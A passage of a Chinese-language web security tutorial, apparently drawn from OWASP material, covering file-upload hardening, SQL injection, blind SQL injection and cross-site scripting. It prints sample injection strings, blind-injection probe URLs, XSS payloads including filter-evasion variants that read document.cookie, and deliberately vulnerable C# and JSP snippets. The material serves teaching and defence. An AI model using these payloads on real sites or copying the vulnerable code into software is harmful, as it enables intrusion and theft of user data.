<li>如果有压缩文件提取功能，则应将压缩文件的内容作为新文件一一检查。</li>
<li>如果可能，请考虑将文件保存在数据库中而不是文件系统上。</li>
<li>如果文件应保存在文件系统中，请考虑使用具有不同域的隔离服务器来提供上传的文件。</li>
<li>如果可能的话，文件上传器应该只能由经过身份验证和授权的用户访问。</li>
<li>应删除上传文件夹以外的文件和文件夹的写入权限。上传文件夹不应提供任何服务</li>
<li>确保无法使用文件上传程序替换“.htaccess”或“web.config”等配置文件。确保有适当的设置可以忽略“.htaccess”或“web.config”文件（如果上传到上传目录）。</li>
<li>确保具有双扩展名的文件（例如“file.php.txt”）无法执行，尤其是在 Apache 中。</li>
<li>确保上传的文件无法被未经授权的用户访问。</li>
<li>将“Content-Disposition: Attachment”和“X-Content-Type-Options: nosniff”标头添加到静态文件的响应中将保护网站免受基于 Flash 或 PDF 的跨站点内容劫持攻击。建议在所有处理文件下载的模块中对用户需要下载的所有文件执行此做法。尽管此方法不能完全保护网站免受使用 Silverlight 或类似对象的攻击，但它可以降低使用 Adobe Flash 和 PDF 对象的风险，特别是在允许上传 PDF 文件的情况下。</li>
<li>如果不使用 Flash&#x2F;PDF (crossdomain.xml) 或 Silverlight (clientaccesspolicy.xml) 跨域策略文件，并且没有业务要求 Flash 或 Silverlight 应用程序与网站进行通信，则应将其删除。</li>
<li>应禁用 crossdomain.xml 和 clientaccesspolicy.xml 文件的浏览器缓存。这使得网站能够在必要时轻松更新文件或限制对 Web 服务的访问。一旦检查了客户端访问策略文件，它对浏览器会话仍然有效，因此非缓存对最终用户的影响很小。根据目标网站的内容以及策略文件的安全性和复杂性，这可以作为低风险或信息风险问题提出。</li>
<li>应审查 CORS 标头，使其仅针对静态或可公开访问的数据启用。否则，“Access-Control-Allow-Origin”标头应仅包含授权地址。其他 CORS 标头（例如“Access-Control-Allow-Credentials”）应仅在需要时使用。CORS 标头中的项目（例如“Access-Control-Allow-Methods”或“Access-Control-Allow-Headers”）应进行审查，如果不需要，请将其删除。</li>
</ul>
<h3 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h3><ul>
<li>改进文件上传者的保护 - 绕过方法 - Rev. 1.0</li>
<li>实现安全文件上传的 8 条基本规则 - SANS - <a href="http://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads">4</a></li>
<li>IIS6&#x2F;ASP 和文件上传的乐趣和利润 <a href="http://blog.48bits.com/2010/09/28/iis6-asp-file-upload-for-fun-and-profit/">5</a></li>
<li>PHP Web 应用程序中的安全文件上传 <a href="http://www.net-security.org/dl/articles/php-file-upload.pdf">6</a></li>
<li>潜在危险的文件类型 <a href="http://www.windowsitpro.com/Files/18/27072/Webtable_01.pdf">7</a></li>
<li><a href="http://hungred.com/useful-information/secure-file-upload-check-list-php/">使用 PHP 10</a>安全文件上传检查列表</li>
<li><a href="https://en.wikipedia.org/wiki/NTFS">维基百科 11</a>中的 NTFS</li>
<li>NTFS 流 [ <a href="http://msdn.microsoft.com/en-us/library/ff469210">http://msdn.microsoft.com/en-us/library/ff469210</a>(v&#x3D;PROT.10 ).aspx]</li>
<li>NTFS - 术语表 <a href="http://inform.pucp.edu.pe/~inf232/Ntfs/ntfs_doc_v0.5/help/glossary.html">12</a></li>
<li>IIS 6.0 安全最佳实践 [ <a href="http://technet.microsoft.com/en-us/library/cc782762">http://technet.microsoft.com/en-us/library/cc782762</a>(WS.10 ).aspx]</li>
<li>使用网站权限保护网站 [ <a href="http://technet.microsoft.com/en-us/library/cc756133">http://technet.microsoft.com/en-us/library/cc756133</a>(WS.10 ).aspx]</li>
<li>IIS 6.0 操作指南 [ <a href="http://technet.microsoft.com/en-us/library/cc785089">http://technet.microsoft.com/en-us/library/cc785089</a>(WS.10 ).aspx]</li>
<li>提高 Web 应用程序安全性：威胁与对策 <a href="http://msdn.microsoft.com/en-us/library/ms994921.aspx">13</a></li>
<li>了解 IIS 7.0 中的内置用户和组帐户 <a href="https://learn.iis.net/page.aspx/140/understanding-the-built-in-user-and-group-accounts-in-iis-70/">14</a></li>
<li>IIS 安全检查表 <a href="http://windows.stanford.edu/docs/IISsecchecklist.htm">15</a></li>
<li>Microsoft IIS ASP 多个扩展安全绕过 <a href="http://secunia.com/advisories/37831/">16</a></li>
<li>CVE-2009-4444 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4444">17</a></li>
<li>CVE-2009-4445 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4445">18</a></li>
<li>CVE-2009-1535 <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1535">19</a></li>
<li>MSDN - 命名文件、路径和命名空间 [ <a href="https://msdn.microsoft.com/en-gb/library/windows/desktop/aa365247">https://msdn.microsoft.com/en-gb/library/windows/desktop/aa365247</a>(v&#x3D;vs.85 ).aspx]</li>
<li>即使上传 JPG 文件也可能导致跨站内容劫持（客户端攻击） <a href="https://soroush.secproject.com/blog/2014/05/even-uploading-a-jpg-file-can-lead-to-cross-domain-data-hijacking-client-side-attack/">20</a></li>
<li>跨站点内容（数据）劫持 (XSCH) PoC 项目 <a href="https://github.com/nccgroup/CrossSiteContentHijacking">21</a></li>
<li>iPhone MobileSafari LibTIFF 缓冲区溢出 <a href="https://www.exploit-db.com/exploits/16862/">22</a></li>
<li>ImageMagick 着火了-CVE-2016–3714 <a href="https://imagetragick.com/">23</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=810">Symantec Antivirus 解压 RAR CVE-2016-2207 24</a>多个远程内存损坏</li>
<li>文件在洞里 - HackPra 2012 年 11 月 <a href="https://www.nds.rub.de/media/attachments/files/2012/11/File-in-the-hole.pdf">25</a></li>
<li>通过 .htaccess 文件进行自包含 Web shell 和其他攻击 <a href="https://github.com/wireghoul/htshells">26</a></li>
<li>上传 web.config 文件以获得乐趣和利润 <a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">27</a></li>
<li>PHP 文件系统攻击向量 - Take Two <a href="http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/">28</a></li>
<li>IIS 上的文件上传和 PHP：&gt;&#x3D;？和 &lt;&#x3D;* 和“&#x3D;。 <a href="https://soroush.secproject.com/blog/2014/07/file-upload-and-php-on-iis-wildcards/">29</a></li>
</ul>
<h2 id="Insecure-CAPTCHA（不安全的验证码）"><a href="#Insecure-CAPTCHA（不安全的验证码）" class="headerlink" title="Insecure CAPTCHA（不安全的验证码）"></a>Insecure CAPTCHA（不安全的验证码）</h2><h2 id="SQL-Injection（SQL-注入）"><a href="#SQL-Injection（SQL-注入）" class="headerlink" title="SQL Injection（SQL 注入）"></a>SQL Injection（SQL 注入）</h2><h3 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h3><p>SQL 注入攻击包括通过从客户端到应用程序的输入数据插入或“注入”SQL 查询。成功的 SQL 注入漏洞可以从数据库读取敏感数据、修改数据库数据（插入&#x2F;更新&#x2F;删除）、对数据库执行管理操作（例如关闭 DBMS）、恢复 DBMS 文件上存在的给定文件的内容系统，并在某些情况下向操作系统发出命令。SQL 注入攻击是注入攻击的一种，将 SQL 命令注入到数据平面输入中，以影响预定义 SQL 命令的执行。</p>
<p>SQL 注入攻击发生在以下情况：</p>
<ol>
<li>非预期数据从不受信任的来源进入程序。</li>
<li>数据用于动态构造 SQL 查询</li>
</ol>
<p>主要后果是：</p>
<ul>
<li><strong>机密性</strong>：由于 SQL 数据库通常保存敏感数据，因此机密性丢失是 SQL 注入漏洞的常见问题。</li>
<li><strong>身份验证</strong>：如果使用较差的 SQL 命令来检查用户名和密码，则可能会以先前不知道密码的其他用户身份连接到系统。</li>
<li><strong>授权</strong>：如果授权信息保存在 SQL 数据库中，则可以通过成功利用 SQL 注入漏洞来更改此信息。</li>
<li><strong>完整性</strong>：正如可以读取敏感信息一样，也可以通过 SQL 注入攻击来更改甚至删除这些信息。</li>
</ul>
<h3 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h3><ul>
<li>SQL 注入攻击允许攻击者欺骗身份、篡改现有数据、导致否认问题（例如作废交易或更改余额）、允许完全泄露系统上的所有数据、破坏数据或使其不可用，并成为系统管理员数据库服务器。</li>
<li>由于旧函数接口的流行，SQL 注入在 PHP 和 ASP 应用程序中非常常见。由于可用编程接口的性质，J2EE 和 ASP.NET 应用程序不太可能轻易利用 SQL 注入。</li>
<li>SQL 注入攻击的严重性受到攻击者的技巧和想象力的限制，较小程度上还受到深度防御对策的限制，例如与数据库服务器的低权限连接等。一般来说，将 SQL 注入视为高影响严重性。</li>
</ul>
<h3 id="风险因素-2"><a href="#风险因素-2" class="headerlink" title="风险因素"></a>风险因素</h3><p>受影响的平台可以是：</p>
<ul>
<li>语言：SQL</li>
<li>平台：任何（需要与 SQL 数据库交互）</li>
</ul>
<p>SQL 注入已成为数据库驱动网站的常见问题。该缺陷很容易检测到，也很容易被利用，因此，任何网站或软件包，即使用户群很少，也可能会受到此类攻击。</p>
<p>本质上，攻击是通过将元字符放入数据输入中，然后将 SQL 命令放入控制平面中来完成的，而控制平面以前并不存在。此缺陷取决于 SQL 没有真正区分控制平面和数据平面。</p>
<h3 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h3><p><strong>实施例 1</strong></p>
<p>以下 C# 代码动态构造并执行 SQL 查询，用于搜索与指定名称匹配的项目。该查询将显示的项目限制为所有者与当前经过身份验证的用户的用户名匹配的项目。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="built_in">string</span> userName = ctx.getAuthenticatedUserName();</span><br><span class="line"><span class="built_in">string</span> query = <span class="string">&quot;SELECT * FROM items WHERE owner = &#x27;&quot;</span></span><br><span class="line">                + userName + <span class="string">&quot;&#x27; AND itemname = &#x27;&quot;</span></span><br><span class="line">                + ItemName.Text + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">sda = <span class="keyword">new</span> SqlDataAdapter(query, conn);</span><br><span class="line">DataTable dt = <span class="keyword">new</span> DataTable();</span><br><span class="line">sda.Fill(dt);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>该代码要执行的查询如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> items</span><br><span class="line"><span class="keyword">WHERE</span> owner <span class="operator">=</span></span><br><span class="line"><span class="keyword">AND</span> itemname <span class="operator">=</span> ;</span><br></pre></td></tr></table></figure>

<p>但是，由于查询是通过连接常量基本查询字符串和用户输入字符串动态构造的，因此只有在<code>itemName</code>不包含单引号字符时查询才会正确运行。如果用户名 wiley 的攻击者输入字符串<code>&quot;name&#39; OR &#39;a&#39;=&#39;a&quot;</code>for <code>itemName</code>，则查询将变为以下内容：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> items</span><br><span class="line"><span class="keyword">WHERE</span> owner <span class="operator">=</span> <span class="string">&#x27;wiley&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> itemname <span class="operator">=</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;a&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>添加条件<code>OR &#39;a&#39;=&#39;a&#39;</code>会导致 where 子句的计算结果始终为 true，因此该查询在逻辑上等同于更简单的查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> items;</span><br></pre></td></tr></table></figure>

<p>这种查询的简化允许攻击者绕过查询仅返回经过身份验证的用户拥有的项目的要求；该查询现在返回 items 表中存储的所有条目，无论其指定所有者是谁。</p>
<h3 id="参考-6"><a href="#参考-6" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection">SQL 注入知识库</a>- MySQL、MSSQL 和 Oracle SQL 注入攻击的参考指南。</li>
<li><a href="http://www.greensql.net/">GreenSQL 开源 SQL 注入过滤器</a>- 开源数据库防火墙，用于保护数据库免受 SQL 注入攻击。</li>
<li>Oracle 开发人员的 SQL 注入攻击简介<ul>
<li>这还包括建议的防御措施。</li>
</ul>
</li>
</ul>
<h2 id="Blind-SQL-Injection（SQL-盲注）"><a href="#Blind-SQL-Injection（SQL-盲注）" class="headerlink" title="Blind SQL Injection（SQL 盲注）"></a>Blind SQL Injection（SQL 盲注）</h2><h3 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h3><p>盲 SQL（结构化查询语言）注入是 SQL 注入攻击的一种，它向数据库询问正确或错误的问题，并根据应用程序的响应确定答案。当 Web 应用程序配置为显示一般错误消息，但并未缓解易受 SQL 注入攻击的代码时，通常会使用此攻击。</p>
<p>当攻击者利用 SQL 注入时，Web 应用程序有时会显示来自数据库的错误消息，抱怨 SQL 查询的语法不正确。SQL 盲注与普通 SQL 注入几乎相同，唯一的区别是从数据库检索数据的方式。当数据库不向网页输出数据时，攻击者被迫通过向数据库询问一系列对或错的问题来窃取数据。这使得利用 SQL 注入漏洞变得更加困难，但并非不可能</p>
<h2 id="威胁建模-1"><a href="#威胁建模-1" class="headerlink" title="威胁建模"></a>威胁建模</h2><p>与 SQL 注入相同</p>
<h2 id="风险因素-3"><a href="#风险因素-3" class="headerlink" title="风险因素"></a>风险因素</h2><p>与 SQL 注入相同</p>
<h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><p>攻击者可以通过以下几种方式验证发送的请求是否返回 true 或 false：</p>
<p><strong>基于内容</strong></p>
<p>使用显示给定 ID 作为参数的文章的简单页面，攻击者可以执行一些简单的测试来确定该页面是否容易受到 SQL 注入攻击。</p>
<p>示例网址：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://newspaper.com/items.php?<span class="built_in">id</span>=2</span><br></pre></td></tr></table></figure>

<p>向数据库发送以下查询：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title, description, body <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>然后，攻击者可能会尝试注入返回“false”的查询：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://newspaper.com/items.php?<span class="built_in">id</span>=2 and 1=2</span><br></pre></td></tr></table></figure>

<p>现在 SQL 查询应该如下所示：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> title, description, body <span class="keyword">FROM</span> items <span class="keyword">WHERE</span> ID <span class="operator">=</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>如果 Web 应用程序容易受到 SQL 注入攻击，那么它可能不会返回任何内容。为了确保这一点，攻击者将注入一个返回“true”的查询：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://newspaper.com/items.php?<span class="built_in">id</span>=2 and 1=1</span><br></pre></td></tr></table></figure>

<p>如果返回“true”的页面内容与返回“false”的页面内容不同，则攻击者能够区分执行的查询何时返回 true 或 false。</p>
<p>一旦验证了这一点，唯一的限制就是数据库管理员设置的权限、不同的 SQL 语法以及攻击者的想象力。</p>
<h3 id="参考-7"><a href="#参考-7" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="http://www.cgisecurity.com/questions/blindsql.shtml">http://www.cgisecurity.com/questions/blindsql.shtml</a></li>
<li><a href="http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html">http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html</a></li>
<li><a href="http://www.securitydocs.com/library/2651">http://www.securitydocs.com/library/2651</a></li>
<li><a href="http://seclists.org/bugtraq/2005/Feb/0288.html">http://seclists.org/bugtraq/2005/Feb/0288.html</a></li>
<li><a href="http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/">http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/</a></li>
<li><a href="https://research.nccgroup.com/wp-content/uploads/2020/07/advanced_sql_injection.pdf">更高级的 SQL 注入</a>- 由 NGS 提供</li>
<li><a href="http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-hotchkies/bh-us-04-hotchkies.pdf">SQL 盲注自动化技术</a>- 黑帽 PDF</li>
<li><a href="http://seclists.org/lists/bugtraq/2005/Feb/0288.html">MySQL 数据库中的 SQL 盲注</a></li>
<li><a href="http://www.cgisecurity.com/questions/blindsql.shtml">Cgisecurity.com：什么是 SQL 盲注？</a></li>
<li><a href="https://wiki.owasp.org/images/7/74/Advanced_SQL_Injection.ppt">高级 SQL 注入</a>- 来自 SPI Dynamics 的 Kevin Spett</li>
</ul>
<h2 id="Weak-Session-IDs（弱会话-ID）"><a href="#Weak-Session-IDs（弱会话-ID）" class="headerlink" title="Weak Session IDs（弱会话 ID）"></a>Weak Session IDs（弱会话 ID）</h2><h2 id="XSS（Cross-Site-Scripting-跨站脚本）"><a href="#XSS（Cross-Site-Scripting-跨站脚本）" class="headerlink" title="XSS（Cross Site Scripting 跨站脚本）"></a>XSS（Cross Site Scripting 跨站脚本）</h2><p>跨站脚本 (XSS) 攻击是一种注入，其中恶意脚本被注入到其他良性且受信任的网站中。当攻击者使用 Web 应用程序向不同的最终用户发送恶意代码（通常以浏览器端脚本的形式）时，就会发生 XSS 攻击。导致这些攻击成功的缺陷相当普遍，并且出现在 Web 应用程序在其生成的输出中使用用户输入而未对其进行验证或编码的任何地方。</p>
<p>攻击者可以使用 XSS 向毫无戒心的用户发送恶意脚本。最终用户的浏览器无法知道该脚本不应被信任，并且将执行该脚本。因为它认为脚本来自受信任的来源，所以恶意脚本可以访问浏览器保留并用于该站点的任何 cookie、会话令牌或其他敏感信息。这些脚本甚至可以重写 HTML 页面的内容。</p>
<h3 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h3><p>跨站脚本 (XSS) 攻击发生在以下情况：</p>
<ol>
<li>数据通过不受信任的来源（最常见的是 Web 请求）进入 Web 应用程序。</li>
<li>该数据包含在发送给 Web 用户的动态内容中，且未经验证是否存在恶意内容。</li>
</ol>
<p>发送到 Web 浏览器的恶意内容通常采用 JavaScript 片段的形式，但也可能包括 HTML、Flash 或浏览器可能执行的任何其他类型的代码。基于 XSS 的攻击种类几乎是无限的，但它们通常包括向攻击者传输隐私数据（如 cookie 或其他会话信息）、将受害者重定向到攻击者控制的 Web 内容，或在用户计算机上执行其他恶意操作在易受攻击的网站的幌子下。</p>
<h3 id="反射和存储的-XSS-攻击"><a href="#反射和存储的-XSS-攻击" class="headerlink" title="反射和存储的 XSS 攻击"></a>反射和存储的 XSS 攻击</h3><p>XSS 攻击一般可以分为两类：反射攻击和存储攻击。还有第三种不太为人所知的 XSS 攻击类型，称为<a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">基于 DOM 的 XSS ，</a><a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">此处</a>将单独讨论。</p>
<h4 id="反射型-XSS-攻击"><a href="#反射型-XSS-攻击" class="headerlink" title="反射型 XSS 攻击"></a>反射型 XSS 攻击</h4><p>反射攻击是指注入的脚本从 Web 服务器反射回来，例如错误消息、搜索结果或任何其他响应，其中包括作为请求的一部分发送到服务器的部分或全部输入。反射攻击通过其他途径传递给受害者，例如通过电子邮件或其他网站。当用户被诱骗点击恶意链接、提交特制表单，甚至只是浏览恶意网站时，注入的代码就会传输到易受攻击的网站，从而将攻击反射回用户的浏览器。然后浏览器执行代码，因为它来自“可信”服务器。反射型 XSS 有时也称为非持久性或 I 类 XSS（攻击通过单个请求&#x2F;响应周期进行）。</p>
<h4 id="存储型-XSS-攻击"><a href="#存储型-XSS-攻击" class="headerlink" title="存储型 XSS 攻击"></a>存储型 XSS 攻击</h4><p>存储攻击是指注入的脚本永久存储在目标服务器上，例如数据库、消息论坛、访问者日志、评论字段等。然后，受害者在请求存储的脚本时从服务器检索恶意脚本。信息。存储型 XSS 有时也称为持久性 XSS 或类型 II XSS。</p>
<h4 id="盲目跨站脚本"><a href="#盲目跨站脚本" class="headerlink" title="盲目跨站脚本"></a>盲目跨站脚本</h4><p>盲目跨站脚本是持久性 XSS 的一种形式。当攻击者的有效负载保存在服务器上并从后端应用程序反射回受害者时，通常会发生这种情况。例如，在反馈表单中，攻击者可以使用表单提交恶意有效负载，一旦应用程序的后端用户&#x2F;管理员通过后端应用程序打开攻击者提交的表单，攻击者的有效负载将被执行。盲目跨站脚本在现实场景中很难确认，但最好的工具之一是 XSS Hunter。</p>
<h3 id="其他类型的-XSS-漏洞"><a href="#其他类型的-XSS-漏洞" class="headerlink" title="其他类型的 XSS 漏洞"></a>其他类型的 XSS 漏洞</h3><p>除了存储型和反射型 XSS 之外，<a href="http://www.webappsec.org/projects/articles/071105.shtml">Amit Klein 在 2005 年</a>还发现了另一种类型的 XSS，即<a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">基于 DOM 的 XSS</a>。OWASP 建议按照 OWASP 文章： <a href="https://owasp.org/www-community/Types_of_Cross-Site_Scripting">跨站脚本类型</a>中所述进行 XSS 分类，其中涵盖了所有这些 XSS 术语，将它们组织成存储与反射 XSS 以及服务器与客户端 XSS 矩阵，其中基于 DOM 的 XSS 是客户端 XSS 的子集。</p>
<h4 id="XSS-攻击后果"><a href="#XSS-攻击后果" class="headerlink" title="XSS 攻击后果"></a>XSS 攻击后果</h4><p>无论是存储还是反射（<a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">或基于 DOM</a>），XSS 攻击的后果都是相同的。不同之处在于有效负载到达服务器的方式。不要误以为“只读”或“宣传册软件”网站不易受到严重的反射型 XSS 攻击。XSS 可能会给最终用户带来各种问题，其严重程度从令人烦恼到彻底的帐户泄露不等。最严重的 XSS 攻击涉及泄露用户的会话 cookie，从而允许攻击者劫持用户的会话并接管帐户。其他破坏性攻击包括泄露最终用户文件、安装特洛伊木马程序、将用户重定向到其他页面或站点，或者修改内容的呈现方式。允许攻击者修改新闻稿或新闻项目的 XSS 漏洞可能会影响公司的股价或削弱消费者的信心。制药网站上的 XSS 漏洞可能允许攻击者修改剂量信息，从而导致用药过量。有关这些类型的攻击的更多信息，请参阅 <a href="https://owasp.org/www-community/attacks/Content_Spoofing">Content_Spoofing</a>。</p>
<h3 id="如何确定您是否易受伤害"><a href="#如何确定您是否易受伤害" class="headerlink" title="如何确定您是否易受伤害"></a>如何确定您是否易受伤害</h3><p>XSS 缺陷可能很难识别并从 Web 应用程序中删除。发现缺陷的最佳方法是对代码进行安全审查，并搜索 HTTP 请求的输入可能进入 HTML 输出的所有位置。请注意，多种不同的 HTML 标签可用于传输恶意 JavaScript。Nessus、Nikto 和其他一些可用的工具可以帮助扫描网站是否存在这些缺陷，但只能触及表面。如果网站的某一部分存在漏洞，则很可能还存在其他问题。</p>
<h3 id="如何保护自己"><a href="#如何保护自己" class="headerlink" title="如何保护自己"></a>如何保护自己</h3><p><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS 预防备忘单</a>中描述了针对 XSS 的主要防御措施。</p>
<p>此外，关闭所有 Web 服务器上的 HTTP TRACE 支持也很重要。即使 document.cookie 被禁用或客户端不支持，攻击者也可以通过 Javascript 窃取 cookie 数据。当用户将恶意脚本发布到论坛时，当另一个用户单击该链接时，就会触发异步 HTTP Trace 调用，该调用从服务器收集用户的 cookie 信息，然后将其发送到另一个恶意服务器，该服务器收集 cookie 信息，以便攻击者可以发起会话劫持攻击。通过在所有 Web 服务器上删除对 HTTP TRACE 的支持，可以轻松缓解此问题。</p>
<p>OWASP <a href="https://www.owasp.org/www-project-enterprise-security-api">ESAPI 项目</a>以多种语言生成了一组可重用的安全组件，包括验证和转义例程，以防止参数篡改和 XSS 攻击注入。此外，<a href="https://www.owasp.org/www-project-webgoat/">OWASP WebGoat 项目</a>培训应用程序还提供有关跨站点脚本和数据编码的课程。</p>
<h3 id="替代-XSS-语法"><a href="#替代-XSS-语法" class="headerlink" title="替代 XSS 语法"></a>替代 XSS 语法</h3><h4 id="在属性中使用脚本的-XSS"><a href="#在属性中使用脚本的-XSS" class="headerlink" title="在属性中使用脚本的 XSS"></a>在属性中使用脚本的 XSS</h4><p>XSS 攻击可以在不使用标签的情况下进行<code>&lt;script&gt;...&lt;/script&gt;</code> 。其他标签将执行完全相同的操作，例如： <code>&lt;body onload=alert(&#39;test1&#39;)&gt;</code>或其他属性，例如：<code>onmouseover</code>, <code>onerror</code>。</p>
<h5 id="鼠标悬停时"><a href="#鼠标悬停时" class="headerlink" title="鼠标悬停时"></a>鼠标悬停时</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">Wufff</span>!&#x27;)&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://url.to.file.which/not.exist&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="通过编码-URI-方案使用脚本的-XSS"><a href="#通过编码-URI-方案使用脚本的-XSS" class="headerlink" title="通过编码 URI 方案使用脚本的 XSS"></a>通过编码 URI 方案使用脚本的 XSS</h4><p>如果我们需要隐藏 Web 应用程序过滤器，我们可以尝试对字符串字符进行编码，例如： (UTF-8) 并在标签<code>a=&amp;\#X41</code>中使用它：<code>IMG</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">jAvascript:alert(</span>&#x27;<span class="attr">test2</span>&#x27;) /&gt;</span></span><br></pre></td></tr></table></figure>

<p>有许多不同的 UTF-8 编码表示法为我们提供了更多可能性。</p>
<h4 id="使用代码编码的-XSS"><a href="#使用代码编码的-XSS" class="headerlink" title="使用代码编码的 XSS"></a>使用代码编码的 XSS</h4><p>我们可以用 base64 编码我们的脚本并将其放置在<code>META</code>标签中。这样我们就彻底摆脱了<code>alert()</code>。有关此方法的更多信息可以在 RFC 2397 中找到</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;refresh&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">content</span>=<span class="string">&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">这些和其他示例可以在 OWASP XSS Filter Evasion Cheat Sheet</a>中找到，这是替代 XSS 语法攻击的真正百科全书。</p>
<h3 id="例子-4"><a href="#例子-4" class="headerlink" title="例子"></a>例子</h3><p>跨站点脚本攻击可能发生在允许恶意用户将不受监管的材料发布到受信任的网站以供其他有效用户使用的任何地方。</p>
<p>最常见的示例可以在提供基于网络的邮件列表样式功能的公告板网站中找到。</p>
<h4 id="实施例-1-1"><a href="#实施例-1-1" class="headerlink" title="实施例 1"></a>实施例 1</h4><p>以下 JSP 代码段从 HTTP 请求中读取员工 ID eid 并将其显示给用户。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;% <span class="type">String</span> <span class="variable">eid</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;eid&quot;</span>); %&gt;</span><br><span class="line">...</span><br><span class="line">Employee ID: &lt;%= eid %&gt;</span><br></pre></td></tr></table></figure>

<p><code>eid</code>如果仅包含标准字母数字文本，则此示例中的代码可以正确运行。如果<code>eid</code>其值包含元字符或源代码，则 Web 浏览器将在显示 HTTP 响应时执行该代码。</p>
<p>最初，这似乎并不是一个很大的漏洞。毕竟，为什么有人会输入导致恶意代码在自己的计算机上运行的 URL？真正的危险在于，攻击者会创建恶意 URL，然后使用电子邮件或社交工程技巧来引诱受害者访问该 URL 的链接。当受害者点击该链接时，他们会无意中通过易受攻击的 Web 应用程序将恶意内容反射回自己的计算机。这种利用易受攻击的 Web 应用程序的机制称为反射型 XSS。</p>
<h4 id="实施例-2"><a href="#实施例-2" class="headerlink" title="实施例 2"></a>实施例 2</h4><p>以下 JSP 代码段在数据库中查询具有给定 ID 的员工并打印相应员工的姓名。</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%...</span><br><span class="line"> <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line"> <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(<span class="string">&quot;select * from emp where id=&quot;</span>+eid);</span><br><span class="line"> <span class="keyword">if</span> (rs != <span class="literal">null</span>) &#123;</span><br><span class="line">  rs.next();</span><br><span class="line">  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">Employee Name: &lt;%= name %&gt;</span><br></pre></td></tr></table></figure>

